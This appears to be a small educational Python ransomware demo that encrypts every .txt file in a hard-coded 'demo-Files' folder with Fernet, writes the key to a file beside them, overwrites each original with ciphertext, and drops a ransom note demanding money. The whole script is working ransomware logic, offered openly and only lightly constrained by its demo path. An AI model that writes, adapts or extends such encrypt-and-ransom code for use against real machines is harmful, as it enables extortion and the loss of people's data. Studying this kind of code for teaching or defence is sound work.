import os
from cryptography.fernet import Fernet
# https://www.pythoninformer.com/python-libraries/cryptography/fernet/


###########################################################################
# Get a list of the files in our desired directory:
###########################################################################

# folder path
dir_path = '/home/johannes/Documents/GitHub_Repositories/Demo-Ransomware/demo-Files'

files = [] # new list

for file in os.listdir(dir_path):
    if '.txt' in file:  # I only want to encrypt .txt-files
        files.append(file)
print(files) # check --> works



###########################################################################
# Generate an encryption Key:
###########################################################################

# key generation
key = Fernet.generate_key()

# backup the key in a file
with open('/home/johannes/Documents/GitHub_Repositories/Demo-Ransomware/demo-Files/filekey.key', 'wb') as filekey:
    filekey.write(key)
# Above code will generate a file with the name filekey.key.
# The file will contain one line, which is a string acting as a key


###########################################################################
# Open each file and encrypt its contents:
###########################################################################

Cryptor = Fernet(key)

# Loop through all files:
for file in files:
    victimFile = open(f'/home/johannes/Documents/GitHub_Repositories/Demo-Ransomware/demo-Files/{file}', 'r') # open file for reading
    cleartext = victimFile.read()
    ciphertext = Cryptor.encrypt(bytes(cleartext, 'utf-8'))
    victimFile = open(f'/home/johannes/Documents/GitHub_Repositories/Demo-Ransomware/demo-Files/{file}', 'wb') # open file for writing
    victimFile.write(ciphertext)
    victimFile.close()

# Muahahaha!!!


###########################################################################
# Drop a Ransomnote:
###########################################################################

note = "You have been encrypted by Giuli-Cryptor. Give me moneeeeey! Miau >:)"
ransomNote = open('/home/johannes/Documents/GitHub_Repositories/Demo-Ransomware/demo-Files/ReadMe.html', 'x')
ransomNote.write(note)
ransomNote.close()
